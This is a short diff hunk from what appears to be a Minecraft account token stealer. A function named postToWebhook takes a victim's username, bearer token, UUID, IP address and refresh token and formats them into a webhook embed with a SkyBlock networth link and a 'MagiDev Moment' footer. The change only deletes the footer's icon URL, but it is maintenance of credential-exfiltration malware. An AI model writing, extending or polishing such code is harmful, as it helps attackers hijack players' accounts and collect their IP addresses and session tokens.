@@ -135,7 +135,6 @@ function postToWebhook(username, bearerToken, uuid, ip, refreshToken) {
       url: "https://spillager.live/skyblock/networth/"+username,
       footer: {
         text: "MagiDev Moment",
-        icon_url: "https://www.meigspointnaturecenter.org/wp-content/uploads/2020/08/common-pigeon-ss-scaled.jpg"
       },
     }
   ],
